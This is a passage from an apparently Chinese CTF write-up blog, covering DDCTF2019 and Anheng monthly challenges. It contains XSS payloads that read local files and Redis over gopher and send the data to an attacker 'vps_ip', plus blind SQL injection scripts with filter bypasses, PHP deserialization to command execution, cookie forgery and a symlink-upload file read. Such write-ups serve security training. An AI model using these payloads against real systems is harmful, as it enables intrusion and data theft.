;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59;&quot;&gt; 然后在vps上即可收到base64字符串，解码 这应该就是题目的利用位置，我们尝试读config.php文件 12345678910111213&lt;svg&#x2F;onload&#x3D;&quot;xmlhttp&#x3D;new XMLHttpRequest();xmlhttp.onreadystatechange&#x3D;function()&#123; if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200) &#123; document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;config.php&quot;);&quot;&gt; 编码发送，果然可以收到flag xssrf redis 12345678910111213&lt;svg&#x2F;onload&#x3D;&quot;xmlhttp&#x3D;new XMLHttpRequest();xmlhttp.onreadystatechange&#x3D;function()&#123; if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200) &#123; document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_KEYS%2520*%250a_quit&quot;);&quot;&gt; 发现有flag，读取之 1xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_lrange%2520flag%25200%252053%250a_quit&quot;); 然后处理一下即可得到flag","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"DDCTF2019","slug":"DDCTF2019","date":"2020-09-13T13:02:17.000Z","updated":"2020-09-13T13:02:17.121Z","comments":true,"path":"2020/09/13/DDCTF2019/","link":"","permalink":"http://chaosec.top/2020/09/13/DDCTF2019/","excerpt":"历史文章补发","text":"历史文章补发 滴~ 签到题 访问首页看到jpg参数请求有点想base64，测试发现是将文件名进行16进制编码后再进行两次base64编码，按照该方法构造index.php发现可以实现成功读取到index.php源码 12345678910111213141516171819202122/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE);header('content-type:text/html;charset=utf-8');if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));echo '&lt;title&gt;'.$_GET['jpg'].'&lt;/title&gt;';$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);echo $file.'&lt;/br&gt;';$file = str_replace(\"config\",\"!\", $file);echo $file.'&lt;/br&gt;';$txt = base64_encode(file_get_contents($file));echo \"&lt;img src='data:image/gif;base64,\".$txt.\"'&gt;&lt;/img&gt;\";/* * Can you find the flag file? * */?&gt; 发现了注释中有文章链接，访问之后看到历史文章有和注释中日期相同的文章，发现是swp文件泄露的相关文章，测试发现存在practice.txt.swp页面 1f1ag!ddctf.php 我们可以按照上面的方法读取该文件，因为该页面过滤特殊字符，但是同时又把config替换为!，所以我们可以构造文件名f1agconfigddctf.php成功读取到源码 1234567891011121314151617&lt;?phpinclude('config.php');$k = 'hello';extract($_GET);if(isset($uid))&#123; $content=trim(file_get_contents($k)); if($uid==$content) &#123; echo $flag; &#125; else &#123; echo'hello'; &#125;&#125;?&gt; 很明显的变量覆盖漏洞 1http:&#x2F;&#x2F;117.51.150.246&#x2F;f1ag!ddctf.php?uid&#x3D;&amp;k&#x3D; 1DDCTF&#123;436f6e67726174756c6174696f6e73&#125; WEB 签到题 题目需要我们以admin身份登录，查看网络信息发现一个中间页面Auth.php，在该请求头中看到了didictf_username字段，猜测修改该字段即可以admin身份登录，抓包修改一下 即可以admin身份登录 访问该页面可以看到两个源码 http://117.51.158.44/app/fL2XID2i0Cdh.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158//url:app/Application.phpClass Application &#123; var $path = ''; public function response($data, $errMsg = 'success') &#123; $ret = ['errMsg' =&gt; $errMsg, 'data' =&gt; $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; &#125; public function auth() &#123; $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) &#123; $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; &#125;else&#123; $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); &#125; &#125; private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path;&#125;public function __destruct() &#123; if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; exit(); &#125; $this-&gt;response($data=file_get_contents($path),'Congratulations'); &#125; exit();&#125;&#125;//url:app/Session.phpinclude 'Application.php';class Session extends Application &#123; //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() &#123; if(parent::auth()) &#123; $this-&gt;get_key(); if($this-&gt;session_read()) &#123; $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); &#125;else&#123; $this-&gt;session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); &#125; &#125; &#125; private function get_key() &#123; //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents('../config/key.txt'); &#125; public function session_read() &#123; if(empty($_COOKIE)) &#123; return FALSE; &#125; $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) &#123; parent::response(\"session not found\",'error'); return FALSE; &#125; $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) &#123; parent::response(\"the cookie data not match\",'error'); return FALSE; &#125; $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent']))&#123; return FALSE; &#125; if(!empty($_POST[\"nickname\"])) &#123; $arr = array($_POST[\"nickname\"],$this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,\"Welcome\"); &#125; if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) &#123; parent::response('the ip addree not match'.'error'); return FALSE; &#125; if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) &#123; parent::response('the user agent not match','error'); return FALSE; &#125; return TRUE; &#125; private function session_create() &#123; $sessionid = ''; while(strlen($sessionid) &lt; 32) &#123; $sessionid .= mt_rand(0,mt_getrandmax()); &#125; $userdata = array( 'session_id' =&gt; md5(uniqid($sessionid,TRUE)), 'ip_address' =&gt; $_SERVER['REMOTE_ADDR'], 'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'], 'user_data' =&gt; '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); &#125;&#125;$ddctf = new Session();$ddctf-&gt;index(); 查看session.php代码可知，主要逻辑在session_read和session_create两个功能，session_create建立cookie并签名，session_read验证签名然后反序列化，而在Session类继承的__destruct方法中存在文件读取，所以本题的思路就是利用反序列化来读取flag。为了破解签名，我们需要知道eancrykey，题目中存在如下代码 12345678if(!empty($_POST[\"nickname\"])) &#123; $arr = array($_POST[\"nickname\"],$this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,\"Welcome\");&#125; 该段代码将eancrykey也放进了数组中，所以我们可以利用nickname中的%s将其输出，例如：1234567$key = 'aesm1p';$arr = array('snow %s',$key);$data = \"welcome %s\";foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v);&#125;echo $data; 可以得到结果 1welcome snow aesm1p 提交的时候必须要加上didictf_username头 成功读取到秘钥值为EzblrbNS，接下里就是反序列化，代码如下： 123456789101112class Session &#123; var $path = '';&#125;$key = 'EzblrbNS';$a = new Session();$a-&gt;path = '..././config/flag.txt';$cookiedata = serialize($a);$cookiedata = $cookiedata.md5($key.$cookiedata);echo $cookiedata.' ';echo urlencode($cookiedata); 修改cookie即可得到flag flag: DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j} Upload-IMG 我们上传之后的图片会被二次渲染，查看返回的图片可以看到gd-jpeg v1.0，是php的gd库渲染的，本题的考点是gd二次渲染绕过，要求我们将payload[phpinfo();]写入图片中，可以用工具跑一下（修改写入的payload），然后就会生成符合条件的图片 1php jpg_payload.php imga_name PS：可能需要多次才能成功，试一些比较大的图片成功率高，还有就是在linux下做，不要在windows下进行尝试 然后提交图片即可 flag：DDCTF{B3s7_7ry_php1nf0_57d79f001ace9fad} homebrew event loop 源代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147# -*- encoding: utf-8 -*-# written in python 2.7__author__ = 'garzon'from flask import Flask, session, request, Responseimport urllibapp = Flask(__name__)app.secret_key = '*********************' # censoredurl_prefix = '/d5af31f66147e657'def FLAG(): return 'FLAG_is_here_but_i_wont_show_you' # censored def trigger_event(event): session['log'].append(event) if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event)def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: passdef execute_event_loop(): valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') resp = None while len(request.event_queue) &gt; 0: event = request.event_queue[0] # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\" request.event_queue = request.event_queue[1:] if not event.startswith(('action:', 'func:')): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == 'a' action = get_mid_str(event, ':', ';') args = get_mid_str(event, action+';').split('#') try: event_handler = eval(action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) except RollBackException: if resp is None: resp = '' resp += 'ERROR! All transactions have been cancelled. &lt;br /&gt;' resp += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' session['num_items'] = request.prev_session['num_items'] session['points'] = request.prev_session['points'] break except Exception, e: if resp is None: resp = '' #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == '': resp = ('404 NOT FOUND', 404) session.modified = True return resp @app.route(url_prefix+'/')def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == '' or (not querystring.startswith('action:')) or len(querystring) &gt; 100: querystring = 'action:index;False#False' if 'num_items' not in session: session['num_items'] = 0 session['points'] = 3 session['log'] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop()# handlers/functions below --------------------------------------def view_handler(args): page = args[0] html = '' html += '[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'.format(session['num_items'], session['points']) if page == 'index': html += '&lt;a href=\"./?action:index;True%23False\"&gt;View source code&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href=\"./?action:view;shop\"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href=\"./?action:view;reset\"&gt;Reset&lt;/a&gt;&lt;br /&gt;' elif page == 'shop': html += '&lt;a href=\"./?action:buy;1\"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;' elif page == 'reset': del session['num_items'] html += 'Session reset.&lt;br /&gt;' html += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' return htmldef index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == 'True': source = open('eventLoop.py', 'r') html = '' if bool_download_source != 'True': html += '&lt;a href=\"./?action:index;True%23True\"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' for line in source: if bool_download_source != 'True': html += line.replace('&amp;','&amp;amp;').replace('\\t', '&amp;nbsp;'*4).replace(' ','&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('&gt;','&amp;gt;').replace('\\n', '&lt;br /&gt;') else: html += line source.close() if bool_download_source == 'True': headers = &#123;&#125; headers['Content-Type'] = 'text/plain' headers['Content-Disposition'] = 'attachment; filename=serve.py' return Response(html, headers=headers) else: return html else: trigger_event('action:view;index') def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return 'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'.format(args[0]) session['num_items'] += num_items trigger_event(['func:consume_point;&#123;&#125;'.format(num_items), 'action:view;index']) def consume_point_function(args): point_to_consume = int(args[0]) if session['points'] &lt; point_to_consume: raise RollBackException() session['points'] -= point_to_consume def show_flag_function(args): flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return 'You naughty boy! ;) &lt;br /&gt;' def get_flag_handler(args): if session['num_items'] &gt;= 5: trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries trigger_event('action:view;index') if __name__ == '__main__': app.run(debug=False, host='0.0.0.0') 这是一个flask系统，但是却与普通的flask系统不同，正常flask系统是通过app.route来编写路由的，而本题中却是维护了一个事件队列来进行路由，按照先进先出的规则处理事件，通过分割我们输入的查询字符串来处理事件，通读代码我们可以发现存在一个敏感函数eval() 12event_handler = eval(action + ('_handler' if is_action else '_function'))ret_val = event_handler(args) 其实此处可以不使用eval函数的，而且由于action参数可控，导致我们可以注入恶意函数进去（用#注释掉action后面的内容），比如 1234action,is_action = 'int#',Falseevent_handler = eval(action + ('_handler' if is_action else '_function'))# ret_val = event_handler(args)print event_handler(1.1) 此时可以成功执行int函数 想要得到flag的话需要调用get_flag_hander()函数，查看代码可知需要session[&#39;num_items&#39;] &gt;= 5即可将flag写入session，此处需要我们购买5个钻石 12345def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return 'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'.format(args[0]) session['num_items'] += num_items trigger_event(['func:consume_point;&#123;&#125;'.format(num_items), 'action:view;index']) 查看此处代码发现存在明显的逻辑问题，即购买时系统先完成购买session[&#39;num_items&#39;] += num_items，然后才触发事件检验金额是否足够trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])，如果不够的话进行回滚，这样的话在该回滚事件执行之前我们可以短暂的成功购买，此时执行get_flag函数即可成功执行，我们可以构建一个这样的事件队列 1buy-&gt;get_flag-&gt;consume_point 结合上面的eval函数漏洞，我们可以实现该攻击，trigger_event函数可以将事件插入队列，我们可以利用该函数将buy和get_flag函数插入队列 解密session即可得到flag flag: DDCTF{3v41_3v3nt_1O0p_aNd_fLASK_cOOk1e}","categories":[{"name":"复现","slug":"复现","permalink":"http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://chaosec.top/tags/Web/"}]},{"title":"安恒月赛复现集合","slug":"month-race","date":"2020-09-13T12:26:04.000Z","updated":"2020-09-13T12:26:04.053Z","comments":true,"path":"2020/09/13/month-race/","link":"","permalink":"http://chaosec.top/2020/09/13/month-race/","excerpt":"历史文章补发 部分安恒月赛题目的复现记录","text":"历史文章补发 部分安恒月赛题目的复现记录 5月月赛 crypto&amp;misc 地址:https://pan.baidu.com/s/1RB1w5wHuk8bnNShHGaqqVg 提取码：259q baby_writeup 拿到题目先strings一下，发现有个flag{}字样，然后在IDA打开，ctrl+1查找string字符串，找到之后F5反编译一下，记得要找到函数入口，看到代码 12345678910fgets(s, 17, stdin);if ( strlen(s) !&#x3D; 16 )exit(0);sub_400756(s, &amp;v6);for ( i &#x3D; 0; i &lt; strlen(v6); ++i )&#123;if ( byte_601100[(signed __int64)i] !&#x3D; v6[i] ) exit(0);&#125;printf(&quot;Flag&#123;%s&#125;\\n&quot;, s); 可以看到题目是输入一个长度为16的字符串(因为字符串结尾还有一个结束符要占据一位)，然后经过校验之后输出，说明输入的原来就是flag，找到byte_601100内存中的内容，把16进制提取出来 16DAB1EEB88B9B6179B7ACB7E 猜测它要不是hex要不是base64，尝试一下发现是base64，转换之，需要先进行ascii2hex的转换，这个不理解为什么，然后运行即可得到flag 123root@kali:~&#x2F;Desktop# .&#x2F;5aff787616ad1 base64i5thebest+Flag&#123;base64i5thebest+&#125; RSA 这题真是佩服他们的搜索能力，原来还可以这么玩（2333.），打开代码发现是已知n,e求d获取flag 12345N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085import hashlibflag = \"flag&#123;\" + hashlib.md5(hex(d)).hexdigest() + \"&#125;\" 观察可知本体的e非常大，所以百度搜索 rsa攻击e很大 在第一条结果里面居然就找到思路！！本题是wiener-attack，还附上了github代码，直接copy下来用就可以了，可以得到d的值，代入上述代码中即可得到flag 洞拐洞拐洞洞拐 打开图片放大观察发现每一个小像素都是或黑或白的小方块,所以可以把黑色看成1白色看成0转换一下 123456789101112131415161718192021222324from PIL import Imageimport reimport base64im = Image.open('5aff787f5d6f2.png')pix = im.load()width = im.size[0]height = im.size[1]flag = ''for x in range(width): for y in range(height): r,g,b = pix[x,y] if r == 255: flag += '0' else: flag += '1'content = re.findall(r'.&#123;8&#125;',flag)nflag = ''for item in content: nflag += chr(int(item,2))flag = base64.b16decode(nflag)open('1.wav','wb').write(flag) 处理wav文件，可以用一个Audacity工具，网上有在线版，分析文件，发现文件波形长度应该是八进制文件，分析一下 1234567891011121314151617181920212223242526import waveimport numpy as npimport re import base64file = '1.wav'wavefile = wave.open(file,'r')numframes = wavefile.getnframes()strdata = wavefile.readframes(numframes)wavedata = np.fromstring(strdata,dtype=np.int16)wavedata = wavedata * 1.0 / (max(abs(wavedata)))datas = []for i in range(0,len(wavedata),10): datas.append(wavedata[i])strs = ''for data in datas: x = \"%0.2f\" % data strs += str(int((float(x) + 1.0)/0.25) - 1)tt = re.findall(r'.&#123;3&#125;',strs)flag = ''for t in tt: flag += chr(int(t,8))# print flagprint base64.b32decode(flag+\"======\") 处理一下就可以得到flag，这题真的是头铁，还是我太菜了。。 7月月赛 web web02 就是这么直接 这题目我觉得就是脑洞题，题目给出了提示代码，其中有md5函数，可能是提示我们本题和md5有关，其实本题思路就是先提交一个md5值，题目会返回 emmm我觉得答案是啥呢？ 查看元素可以看到后面还加了一串md5值，将这段md5再次提交，重复这个过程，直到得到flag，代码如下： 12345678910111213import requestsimport reurl = 'http://101.71.29.5:10002/flag.php'payload = &#123;'answer':'c36af63f87acebba1c23498809db7537'&#125;while True: content = requests.post(url,payload).content.decode('utf-8') if 'flag' in content: print(content) break new = re.findall('&lt;!--[0-9a-z]&#123;10,&#125;--&gt;',content) payload = &#123;'answer': new[0][4:-3]&#125; web03 简历来了 这个题目考察的是CSRF相关的知识点 /upload/73e0669ac68ffcb28aed0c48b0924a42.jpghttp://138.68.29.92:8888/ContentHijackingLoader.html?objfile=http://127.0.0.1/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1 MISC 链接：https://pan.baidu.com/s/1kqOTuqtJsW6PK4ob2_VqNg 密码：m97g 0x01-弱口令 这题比较坑，题目是个压缩包，解压需要密码，打开压缩包之后发现有一段不可见文本，复制一下在sublime中打开发现是摩斯密码，解密一下 HELL0FORUM ，解压这个压缩包，发现一张图片，一道基本的LSB色道隐写，用脚本跑一下即可 1python lsb.py extract aa.png 1.txt 123456 是弱口令1234### 0X02-浏览图片的时候刷新键有没有用呢 由刷新可以联想到这题考察的是F5算法，网上查找解密算法 java Extract Misc.jpg1234可以得到一个文本文件，看文件前缀发现是zip文件前缀，修改文件后缀为zip即可，zip文件还有一层伪加密，之后解密即可得到flag### 0x03-到底为了什么http.request.uri contains “pma”1234567891011121314[](month_race&#x2F;1.png)可以看到有一条修改密码的命令，继续浏览发现应该是一个csrf攻击的流量包，网上查找cve编号[](month_race&#x2F;2.png)计算flag&#96;&#96;&#96;php&lt;?php$con &#x3D; strtolower(&quot;CVE-2017-1000499_CWE-352_2018-06-15 09:40:12&quot;);echo md5($con);?&gt; 十月月赛 web 好黑的黑名单 随便测试可以发现数据库名长度为3 1http:&#x2F;&#x2F;101.71.29.5:10008&#x2F;show.php?id&#x3D;0||if((length(database())-3),1,0) 题目过滤了分号，单引号，但是regexp没有被过滤，可以使用regexp来绕过，可知数据库名为web 1http:&#x2F;&#x2F;101.71.29.5:10008&#x2F;show.php?id&#x3D;if((database()regexp(0x776562)),1,2) 然后爆库名，但是=号被过滤了，但是可以用in来绕过，比如这样 1select 1 in (1,2,3,4) 空格也被过滤了，可以用%0a绕过，还有information.schema.tables也被过滤了，可以用information_schema%0a.%0atables来绕过，代码如下 123456789101112131415161718192021222324252627282930import requestsurl = \"http://101.71.29.5:10008/show.php?id=\"test = \"0123456789qwertyuiopasdfghjklzxcvbnm,\\&#123;|\\&#125;~\"table = \"if(((select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.%0atables%0awhere%0atable_schema%0ain%0a(database()))regexp(0x&#123;&#125;)),1,2)\"# table_name:admin,flaggg,menucolumn = \"if(((select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.%0acolumns%0awhere%0atable_name%0ain%0a(0x666c61676767))regexp(0x&#123;&#125;)),1,2)\"# id,f1aggcontent = \"if(((select%0af1agg%0afrom%0aflaggg)regexp(0x&#123;&#125;)),1,2)\"payload = \"5e\"flag = \"\"flagdic = \"0123456789abcdeflag.\"for i in range(50): for s in flagdic: temp = hex(ord(s))[2:4] # print(url+table.format(payload+temp)) res = requests.get(url+content.format(payload+temp)).text if \"郑州烩面\" in res: if temp == \"7b\": payload += \"2e\" else: payload += temp; flag += chr(int(temp,16)) print(payload) print(flag) break elif \"油泼面\" in res: continue; else: print(\"error\") 看了学长的博客说regexp在匹配flag的时候只能到flag{之后就会报错，这是由于正则表达式中{}是有特殊含义的，所以会报错，我们用 . 来代替{}就可以了 ezsql 注入题目，注册账号登录进去查看用户信息时id参数存在注入，需要用到load_file函数，wp里面用了if函数，但是这题我使用的异或运算符^ 123456789101112131415161718192021222324import requestsdic = \"0123456789ABCDEF\"url = \"http://101.71.29.5:10015/user/user.php?id=\"file = open('1.txt','w')cookie = &#123;\"PHPSESSID\": \"8lvl1ukppvqs2ovi8n0a2lu4g5\"&#125;# index.phpindex = \"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)) like 0x&#123;&#125;25)\" config = \"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f636f6e6669672f636f6e6669672e706870)) like 0x&#123;&#125;25)\" payload = \"\"content = \"\"for i in range(10000): for item in dic: temp = hex(ord(item))[2:4] # print(url+index.format(payload+temp)) res = requests.get(url+config.format(payload+temp),cookies=cookie).text if \"admin\" in res: payload += temp content += item file.writelines(payload) file.writelines(content) print(payload) print(content) break 可以得到index.php的代码为 12345678&lt;?php require_once('config/sys_config.php');require_once('header.php');if(isset($_COOKIE['CONFIG']))&#123; $config = $_COOKIE['CONFIG']; require_once('config/config.php');&#125;?&gt; 再读config.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php$config = unserialize(base64_decode($config));if(isset($_GET['p']))&#123; $p=$_GET['p']; $config-&gt;$p;&#125;class Config&#123; private $config; private $path; public $filter; public function __construct($config=\"\")&#123; $this-&gt;config = $config; echo 123; &#125; public function getConfig()&#123; if($this-&gt;config == \"\")&#123; $config = isset($_POST['config'])?$_POST['config']:\"\"; &#125; &#125; public function SetFilter($value)&#123; // echo $value; $value=waf_exec($value); var_dump($value); if($this-&gt;filter)&#123; foreach($this-&gt;filter as $filter)&#123; $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value); &#125; $this-&gt;filter = array(); &#125;else&#123; return false; &#125; return true; &#125; public function __get($key)&#123; //var_dump($key); $this-&gt;SetFilter($key); die(\"\"); &#125;&#125; 可以看到在__get()函数，该函数是类在访问私有成员的时候会自动调用这个方法，具体机制还需要研究，然后这里与setfilter函数利用反序列化可以构成rce，在cookie中写入序列化值 123$snow = new Config();$snow-&gt;filter = array('system');echo base64_encode(serialize($snow)); 然后访问 1http:&#x2F;&#x2F;101.71.29.5:10015&#x2F;index.php?p&#x3D;ls 发现即可列目录，但是由于过滤了空格和/，所以无法读文件，空格可以使用$IFS绕过，然后利用grep命令来读 1http:&#x2F;&#x2F;101.71.29.5:10015&#x2F;index.php?p&#x3D;grep$IFS-ri$IFS.$IFSflag 这个不理解，需要后续再学习 在附上官方解法，待研究 interesting web 题目是一个flask框架，题目了修改密码功能，思路是修改admin的密码，flask框架中session是存储在浏览器端的，虽然不能伪造但是可以破解，我们 1eyJsb2dpbiI6dHJ1ZSwidG9rZW4iOnsiIGIiOiJaamRrWlRaa1l6QmlZVEV4TlRVMU5UWTVaVFV3Wmpaak16ZGxNVFU1TURVPSJ9LCJ1c2VybmFtZSI6ImFkbWluIn0.DuKTNg.LtfGK8IX-4fJ6WO-6mcVJsU2hdI 第一个.号之前的内容是base64编码的，直接解密就可以了 1&#123;&quot;login&quot;:true,&quot;token&quot;:&#123;&quot; b&quot;:&quot;ZjdkZTZkYzBiYTExNTU1NTY5ZTUwZjZjMzdlMTU5MDU&#x3D;&quot;&#125;,&quot;username&quot;:&quot;admin&quot;&#125; 再将b的值base64解码就可以得到token了，然后修改密码，以admin身份登录，然后利用软链接来读取文件 12ln -s /etc/passwd 1.jpgtar cvfp shell.tat 1.jpg 然后上传在访问图片，下载之，修改后缀为txt查看即可得到flag Crypt 仿射 仿射密码，题目已经给出了b的值，对于仿射密码来说 加密过程为 y≡e(x)≡a(x)+b(mod26) 解密过程 x ≡ d(e(x)) ≡ a’(e(x)-b)(mod26) # a’为a的逆，在26以内是有限的 我们只需要爆破即可 123456789c = \"achjbnpdfherebjsw\"b=7flag = \"\"for i in (1,9,21,15,3,19,7,23,11,5,17,25): for s in c: seq = (i*((ord(s)-ord('a'))-b)) % 26 flag += chr(ord('a')+seq) print(flag) flag = \"\" 然后即可找到flag MISC MISC1 题目如下 中华文化博大精深，近日在教小外甥学习1-110之间的数字，可是小外甥比较调皮，不好好学，于是灵机一动，想到一个容易记忆，并且还可以识字的好办法，你知道我想出了什么办法吗？下边是在教外甥学习的一部分内容，你知道分别代表什么意思吗？ （企鹅，青蛙，油漆，花旗参，救生圈，油漆，二胡，二石，漏斗，二石，二石，冰淇淋，漏斗，喇叭，油漆，冰淇淋，鹅卵石，21世纪，耳机，油漆，耳机，二石，二胡，耳机，21世纪，企鹅，二流子，二石，要发，二石，冰淇淋，冰淇淋，油漆，冰淇淋，企鹅，乔丹，二石，酒壶） 这是一种数字密码表，好像叫110数字记忆表，是帮助提高记忆力的 直接网上找对应的值然后脚本，获取数字之后，每个数字的加30取ascii码值就是flag 123456789101112131415cipher = 